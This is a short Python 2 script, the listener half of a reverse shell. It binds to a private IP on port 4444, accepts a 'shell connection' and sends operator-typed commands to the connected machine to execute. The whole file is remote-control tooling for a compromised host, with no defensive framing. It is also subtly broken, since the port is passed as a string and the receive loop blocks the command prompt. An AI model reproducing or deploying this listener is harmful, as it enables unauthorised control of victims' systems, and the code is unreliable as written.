'''
Created on 30 Aug 2017

@author: Muhammad Arslan <rslnkrmt2552@gmail.com>
'''

import socket
import sys

host = "192.168.86.129"
port = "4444"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((host, port))
server.listen(5)

print "[*] Server bound to %s:%s" % (host, port)
connected = False

while True:
    if not connected:
        client, addr = server.accept()
        connected = True
        print "[*] Accepted Shell Connection"
    
    buff = ""
    
    while True:
        try:
            recv_buffer = client.recv(4096)
            if not len(recv_buffer):
                break
            else:
                print "[*] Recieved: %s" % recv_buffer
                buff += recv_buffer
        except:
            break
    
    command = raw_input("Enter command > ")
    client.sendall(command + "\r\n\r\n")
    print "[*] Sent => %s" % command